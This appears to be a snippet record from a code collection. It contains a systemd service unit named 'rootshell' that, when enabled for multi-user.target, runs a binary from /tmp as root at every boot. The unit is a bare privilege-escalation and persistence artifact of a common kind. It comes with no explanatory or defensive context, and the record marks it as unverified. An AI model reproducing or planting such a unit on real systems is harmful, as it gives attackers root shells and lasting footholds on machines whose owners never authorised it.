---
id: a04a76ac-ac1f-4a11-9e05-805280c27f54
type: code
language: Systemd Service
verified: false
created_at: '2020-03-16T07:57:30.023119+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet a04a76ac

**Language**: Systemd Service

```systemd service
[Unit]
Description=rootshell
[Service]
Type=notify
ExecStart=/bin/bash -c /tmp/rootshell
[Install]
WantedBy=multi-user.target
```


